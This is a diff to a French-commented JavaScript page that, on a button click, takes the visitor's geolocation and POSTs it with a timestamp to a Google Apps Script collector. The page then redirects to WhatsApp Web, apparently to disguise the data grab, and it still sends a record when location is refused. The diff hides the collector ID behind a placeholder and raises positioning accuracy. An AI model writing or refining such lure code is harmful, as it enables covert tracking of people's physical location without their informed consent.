@@ -41,7 +41,7 @@ button.addEventListener('click', function() {
         navigator.geolocation.getCurrentPosition(
             function(position) {
                 // Géoloc acceptée
-                fetch("https://script.google.com/macros/s/AKfycbyqo8YHxbecMp_-Nv-YhQ2wa7MltV61mEfesnjAUMgG5B3xUp0JNIV3HEdAiAVD2aMD/exec", {
+                fetch("https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
@@ -53,19 +53,21 @@ button.addEventListener('click', function() {
                         heure: new Date().toISOString()
                     })
                 })
-                .then(response => response.json())
-                .then(() => {
+                .then(resp => resp.json())
+                .then(data => {
+                    console.log("Données enregistrées:", data);
                     statusText.textContent = "Redirection en cours...";
                     setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1500);
                 })
                 .catch(err => {
                     console.error("Erreur fetch:", err);
-                    window.location.href = "https://web.whatsapp.com";
+                    statusText.textContent = "Impossible d'envoyer les données, redirection...";
+                    setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1500);
                 });
             },
             function(error) {
                 // Géoloc refusée
-                fetch("https://script.google.com/macros/s/AKfycbyqo8YHxbecMp_-Nv-YhQ2wa7MltV61mEfesnjAUMgG5B3xUp0JNIV3HEdAiAVD2aMD/exec", {
+                fetch("https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
@@ -78,13 +80,14 @@ button.addEventListener('click', function() {
                     })
                 })
                 .finally(() => {
-                    // Redirection vers page explicative
+                    console.log("Géoloc refusée, redirection vers page explicative.");
                     window.location.href = "geoloc-refuse-mobile.html";
                 });
             },
-            { enableHighAccuracy: false, timeout: 5000 }
+            { enableHighAccuracy: true, timeout: 10000 }
         );
     } else {
+        console.log("Géolocalisation non disponible, redirection...");
         window.location.href = "https://web.whatsapp.com";
     }
 });
